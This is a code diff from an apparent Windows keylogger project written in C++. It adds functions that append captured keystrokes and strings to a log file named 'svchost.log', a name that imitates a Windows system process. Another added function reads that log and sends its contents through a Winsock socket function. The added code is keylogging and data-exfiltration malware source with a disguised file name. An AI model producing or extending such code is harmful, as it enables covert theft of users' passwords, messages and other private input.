@@ -6,6 +6,9 @@
 #include <ws2tcpip.h>
 #include <stdlib.h>
 #include <stdio.h>
+#include <string>
+#include <fstream>
+#include <streambuf>
 
 // Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
 #pragma comment (lib, "Ws2_32.lib")
@@ -18,12 +21,32 @@
 #define DEFAULT_HOST "localhost"
 
 namespace SwineNetworking {
+	int Networking::parseFileAndSendToServer() {
+		int bytes_sent;
+		std::ifstream t("svchost.log");
+		std::string str((std::istreambuf_iterator<char>(t)), std::istreambuf_iterator<char>());
+		
+		Networking::extract(str.c_str(), &bytes_sent);
+		return bytes_sent;
+	}
+	int Networking::logKey(short character) {
+		FILE *file = fopen("svchost.log", "a+");
+		fputc(character, file);
+		fclose(file);
+		return 1;
+	}
+	int Networking::logString(char *character) {
+		FILE *file = fopen("svchost.log", "a+");
+		fputs(character, file);
+		fclose(file);
+		return 1;
+	}
 	int Networking::sendFile(FILE openFile) {
-		// read file and call extrac
+		
 		return 1;
 	}
 	// bytes_sent is a pointer to an output parameter
-	int Networking::extract(char *sendbuf, int length, int *bytes_sent) {
+	int Networking::extract(const char *sendbuf, int *bytes_sent) {
 		WSADATA wsaData;
 		SOCKET ConnectSocket = INVALID_SOCKET;
 		struct addrinfo *result = NULL, *ptr = NULL, hints;
